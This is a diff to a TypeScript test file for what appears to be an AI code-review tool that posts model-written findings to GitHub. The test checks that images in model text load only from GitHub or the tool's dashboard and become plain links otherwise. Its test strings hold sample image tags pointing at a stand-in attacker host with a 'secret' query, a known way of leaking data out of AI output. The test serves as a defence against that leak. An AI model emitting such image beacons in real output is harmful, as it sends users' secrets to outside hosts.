@@ -14,6 +14,7 @@ import {
   oldLines,
   parseState,
   place,
+  prose,
   redact,
   type Review,
   renderSummary,
@@ -270,19 +271,26 @@ test("the headline can't close the alert or add HTML", () => {
   expect(body).toContain('> Bad &lt;a href=x onclick=y&gt;\n> \n> # not a heading\n>\n');
 });
 
-test('images in model text are stripped before posting, so a URL in one carries nothing out', () => {
-  const leak = 'See ![x](https://evil.example/?t=secret) and ![a [b]](https://evil.example/2) and <img src="https://evil.example/3"> and ![r][ref].';
+test("an image in model text loads only from GitHub or the dashboard; any other becomes a plain link, so its URL carries nothing out", () => {
+  const leak =
+    'See ![x](https://evil.example/?t=secret) and ![a [b]](https://evil.example/2) and <img src="https://evil.example/3" alt="three"> and ![r][ref] and !![two](https://evil.example/4) and ![outer ![in](https://evil.example/5)](https://github.com/a.png).';
   const placed = place([finding({ file: 'src/config.ts', line: 10, title: `t ${leak}`, body: leak })], files, 'summary');
   const full = renderSummary({ ...review, headline: leak, claim: leak }, placed, undefined, info);
   // The hidden state line keeps the raw title for matching; GitHub never renders it.
   const body = full.slice(0, full.lastIndexOf('\n<!-- shaft:state'));
-  expect(body).not.toContain('evil.example');
-  // The only image left is our own status card, from the dashboard.
-  expect([...body.matchAll(/!\[[^\]]*\]\(([^)]*)\)/g)].map((m) => m[1])).toEqual(['https://shaft.axonpack.dev/status/needs-changes.svg']);
+  expect(body).toContain(
+    'See [x](https://evil.example/?t=secret) and [a [b]](https://evil.example/2) and [three](https://evil.example/3) and [r][ref] and [two](https://evil.example/4) and [outer [in](https://evil.example/5)](https://github.com/a.png).',
+  );
+  // A GitHub image stays an image.
+  expect(prose('![shot](https://github.com/user-attachments/assets/1)')).toBe('![shot](https://github.com/user-attachments/assets/1)');
+  // The only image left is our own status card; one hidden in another's alt text made both links.
   expect(body.match(/!\[/g)).toHaveLength(1);
-  expect(body).toContain('See  and  and  and .');
+  expect(body).not.toMatch(/<img[^>]*evil/);
   const [inline] = place([finding({ body: leak })], files, 'summary');
-  expect(inlineBody(inline)).not.toContain('evil.example');
+  expect(inlineBody(inline)).not.toMatch(/!\[[^\]]*\]\(https:\/\/evil/);
+  expect(prose('<img src="https://user-images.githubusercontent.com/1.png"> <img src="https://github.com/a.png" srcset="https://evil.example/x 2x">')).toBe(
+    '<img src="https://user-images.githubusercontent.com/1.png"> [image](https://github.com/a.png)',
+  );
 });
 
 test("a title or body with | or a line break can't break the table; a range links L<line>-L<end>", () => {
